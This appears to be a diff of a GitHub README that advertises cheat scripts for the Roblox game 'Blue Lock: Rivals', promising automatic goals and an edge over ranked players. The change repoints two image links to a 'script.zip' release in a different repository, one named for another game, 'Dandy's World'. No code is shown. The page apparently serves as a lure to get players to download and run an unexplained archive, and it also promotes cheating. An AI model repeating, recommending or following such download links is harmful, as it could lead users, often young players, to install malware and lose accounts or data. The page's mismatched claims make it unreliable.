@@ -5,10 +5,10 @@ Are you ready to dominate the field in **Blue Lock: Rivals** on Roblox with next
 Unlock the ultimate striker potential with scripts designed to help you **score goals automatically**, **master stamina**, and **outplay every opponent** — even those sweaty ranked players.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/86b6f5df-aa2e-4164-b04e-5179c5985a40)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
